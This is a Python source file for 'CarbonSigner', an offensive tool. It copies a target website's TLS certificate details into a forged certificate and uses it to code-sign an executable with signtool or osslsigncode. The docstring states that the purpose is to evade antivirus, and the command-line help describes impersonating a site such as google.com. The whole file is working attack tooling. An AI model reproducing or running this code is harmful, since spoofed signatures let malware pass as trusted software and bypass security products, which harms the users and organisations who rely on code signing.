#!/usr/bin/python3

"""
OP : Paranoid Ninja
Email  : paranoidninja@protonmail.com
Author : dozer404
Descr  : Spoofs SSL Certificates and Signs executables to evade Antivirus
Refactored to use 'cryptography' library and modern Python practices.
"""

import argparse
import logging
import os
import shutil
import ssl
import subprocess
import sys
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import pkcs12

# Modern timestamp server
TIMESTAMP_URL = "http://timestamp.digicert.com"

# Set up logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

def carbon_copy(host, port, signee, signed):
    try:
        # Fetching Details
        logger.info(f"Loading public key of {host} in Memory...")
        try:
            ogcert_pem = ssl.get_server_certificate((host, int(port)))
        except Exception as e:
            logger.error(f"Failed to fetch certificate from {host}:{port}: {e}")
            return

        x509_obj = x509.load_pem_x509_certificate(ogcert_pem.encode())

        cert_dir = Path('certs')
        cert_dir.mkdir(exist_ok=True)

        # Creating Fake Certificate paths
        cncrt_path = cert_dir / f"{host}.crt"
        cnkey_path = cert_dir / f"{host}.key"
        pfx_path = cert_dir / f"{host}.pfx"

        # Creating Keygen
        logger.info("Generating new RSA key (2048 bits)...")
        # Ensure at least 2048 bits for modern OpenSSL/Windows compatibility
        key_size = max(2048, x509_obj.public_key().key_size if hasattr(x509_obj.public_key(), 'key_size') else 2048)
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
        )

        # Setting Cert details cloned from the original Certificate
        logger.info("Cloning Certificate details and extensions...")
        builder = x509.CertificateBuilder()
        builder = builder.subject_name(x509_obj.subject)
        builder = builder.issuer_name(x509_obj.issuer)
        builder = builder.not_valid_before(x509_obj.not_valid_before_utc)
        builder = builder.not_valid_after(x509_obj.not_valid_after_utc)
        builder = builder.serial_number(x509_obj.serial_number)
        builder = builder.public_key(private_key.public_key())

        # Clone Extensions, skipping key-specific ones
        for extension in x509_obj.extensions:
            if extension.oid in (x509.ExtensionOID.SUBJECT_KEY_IDENTIFIER, 
                                 x509.ExtensionOID.AUTHORITY_KEY_IDENTIFIER):
                continue
            builder = builder.add_extension(extension.value, extension.critical)

        # Sign the certificate
        logger.info("Signing cloned certificate...")
        new_cert = builder.sign(
            private_key=private_key,
            algorithm=hashes.SHA256(),
        )

        logger.info(f"Creating {cncrt_path} and {cnkey_path}")
        cncrt_path.write_bytes(new_cert.public_bytes(serialization.Encoding.PEM))
        cnkey_path.write_bytes(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

        logger.info("Clone process completed. Creating PFX file for signing executable...")
        pfx_data = pkcs12.serialize_key_and_certificates(
            name=host.encode(),
            key=private_key,
            cert=new_cert,
            cas=None,
            encryption_algorithm=serialization.NoEncryption()
        )
        pfx_path.write_bytes(pfx_data)

        if sys.platform == "win32":
            logger.info("Platform is Windows OS...")
            logger.info(f"Signing {signed} with signtool.exe...")
            shutil.copy(signee, signed)
            subprocess.check_call([
                "signtool.exe", "sign", "/v", "/f", str(pfx_path),
                "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
                "/td", "SHA256", "/fd", "SHA256", signed
            ])
        else:
            logger.info("Platform is Linux OS...")
            logger.info(f"Signing {signee} with {pfx_path} using osslsigncode...")
            args = [
                "osslsigncode", "sign", "-pkcs12", str(pfx_path),
                "-n", "Notepad Benchmark Util", "-ts", TIMESTAMP_URL,
                "-in", signee, "-out", signed
            ]
            subprocess.check_call(args)
        
        logger.info("Successfully signed executable!")

    except Exception as ex:
        logger.exception(f"Something Went Wrong! Exception: {ex}")

def main():
    banner = """ +-+-+-+-+-+-+-+-+-+-+-+-+
 |C|a|r|b|o|n|S|i|g|n|e|r|
 +-+-+-+-+-+-+-+-+-+-+-+-+

  CarbonSigner v2.0 (Refactored)
  OP: Paranoid Ninja
  Author: dozer404
"""
    print(banner)
    
    parser = argparse.ArgumentParser(description="Impersonates the Certificate of a website and signs an executable.")
    parser.add_argument("hostname", help="Target hostname to spoof (e.g., google.com)")
    parser.add_argument("port", type=int, help="Target port (usually 443)")
    parser.add_argument("executable", help="Source executable to sign")
    parser.add_argument("output", help="Output filename for the signed executable")
    
    args = parser.parse_args()
    
    carbon_copy(args.hostname, args.port, args.executable, args.output)

if __name__ == "__main__":
    main()
